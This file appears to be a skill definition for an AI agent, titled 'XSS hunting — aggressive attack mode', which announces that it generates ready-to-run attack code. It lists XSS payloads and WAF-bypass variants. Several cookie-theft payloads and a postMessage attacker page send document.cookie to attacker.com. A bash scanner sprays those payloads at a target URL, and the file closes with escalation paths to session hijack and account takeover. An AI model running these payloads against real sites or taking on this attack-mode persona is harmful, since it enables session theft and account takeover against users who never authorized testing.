---
name: hunt-xss
description: XSS hunting — Reflected, Stored, DOM-based. Generates ready-to-run payloads, WAF bypass techniques, and escalation paths. Use when testing for XSS. This skill produces executable attack code, not theoretical guidance.
---

# XSS HUNTING — AGGRESSIVE ATTACK MODE

**This skill generates ready-to-run XSS attacks.**

## Quick Start

```bash
# Test a URL parameter for XSS
TARGET="https://example.com/search?q="
curl -s "$TARGET<script>alert(1)</script>" | grep -q "script>alert" && echo "XSS CONFIRMED"

# Test with curl and cookie
curl -s -b "session=TOKEN" "$TARGET<script>alert(document.domain)</script>"
```

## Payload Arsenal

### Detection Payloads
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
```

### Impact Payloads (Cookie Theft)
```html
<script>document.location='https://attacker.com/c?c='+document.cookie</script>
<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
<script>fetch('https://attacker.com?c='+btoa(document.cookie))</script>
<script>new Image().src='https://attacker.com?c='+document.cookie</script>
<img src=x onerror="var x=new XMLHttpRequest();x.open('GET','https://attacker.com?c='+document.cookie);x.send()">
```

### WAF Bypass Payloads
```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Encoding -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- Comments -->
<scr/**/ipt>alert(1)</scr/**/ipt>

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Unicode -->
%u003cscript%u003ealert(1)%u003c/script%u003e

<!-- Null bytes -->
%00<script>alert(1)</script>

<!-- SVG -->
<svg/onload=alert(1)>
<svg onload=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

<!-- IMG -->
<img src=x onerror=alert(1)>
<img src=x onerror=alert&#40;1&#41;>
<img src=x onerror="&#97;lert(1)">

<!-- Details -->
<details open ontoggle=alert(1)>

<!-- Anchor -->
<a href="javascript:alert(1)">click</a>
<a href="&#106;avascript:alert(1)">click</a>

<!-- Input -->
<input onfocus=alert(1) autofocus>
<input onblur=alert(1) autofocus><input autofocus>

<!-- Body -->
<body onload=alert(1)>

<!-- Marquee -->
<marquee onstart=alert(1)>
<marquee onfinish=alert(1)>

<!-- Video -->
<video><source onerror=alert(1)>
<video onerror=alert(1) src=x>

<!-- Audio -->
<audio src=x onerror=alert(1)>

<!-- Object -->
<object data="javascript:alert(1)">
<object onerror=alert(1)>

<!-- Iframe -->
<iframe src="javascript:alert(1)">
<iframe srcdoc="<script>alert(1)</script>">

<!-- Polyglot -->
'">><marquee><img src=x onerror=confirm(1)></marquee>
```

### DOM XSS Sources → Sinks

**Sources** (user-controlled):
```javascript
location.hash, location.search, location.href, document.referrer, window.name, document.URL
```

**Sinks** (dangerous):
```javascript
innerHTML, outerHTML, document.write, eval, setTimeout(string), setInterval(string),
new Function, element.src, element.href, location.href
```

**postMessage XSS:**
```javascript
// Find listeners
getEventListeners(window).message

// Attacker page
<iframe src="https://victim.com" id="v"></iframe>
<script>
document.getElementById('v').onload = () => {
  document.getElementById('v').contentWindow.postMessage(
    '<img src=x onerror="fetch(\'//attacker.com/?c=\'+document.cookie)">', '*')
}
</script>
```

## Automated XSS Scanner

```bash
#!/bin/bash
TARGET=$1
PARAM=$2

PAYLOADS=(
  "<script>alert(1)</script>"
  "<img src=x onerror=alert(1)>"
  "<svg onload=alert(1)>"
  "\"><script>alert(1)</script>"
  "'><script>alert(1)</script>"
  "javascript:alert(1)"
  "<script>fetch('https://attacker.com?c='+document.cookie)</script>"
  "<img src=x onerror=\"fetch('https://attacker.com?c='+document.cookie)\">"
)

for payload in "${PAYLOADS[@]}"; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
  response=$(curl -s "$TARGET?$PARAM=$encoded")
  
  if echo "$response" | grep -qF "$payload"; then
    echo "[+] XSS CONFIRMED: $payload"
    echo "    URL: $TARGET?$PARAM=$encoded"
    echo "    Response snippet:"
    echo "$response" | grep -oF "$payload" | head -1
  fi
done
```

## Escalation Paths

| XSS Type | Escalation | Severity |
|----------|------------|----------|
| Reflected + cookie theft | Session hijack → ATO | Critical |
| Stored + admin panel | Privilege escalation | Critical |
| DOM + OAuth flow | Token theft → ATO | Critical |
| Self-XSS + CSRF | Trigger on victim → ATO | High |
| Reflected + CSP bypass | Bypass all defenses | High |
| Stored + WebSocket | Real-time data exfil | High |

## WAF Bypass Decision Tree

```
Is <script> blocked?
├── YES → Try <img onerror>, <svg onload>, <details ontoggle>
├── YES and all HTML tags blocked → Try javascript: URI, event handlers
├── YES and all event handlers blocked → Try CSS injection, <base> tag
└── NO → Use basic payload, focus on cookie theft

Is alert(1) blocked?
├── YES → Try confirm(1), prompt(1), console.log(1)
├── YES and all JS functions blocked → Try String.fromCharCode, atob
└── NO → Use basic payload
```
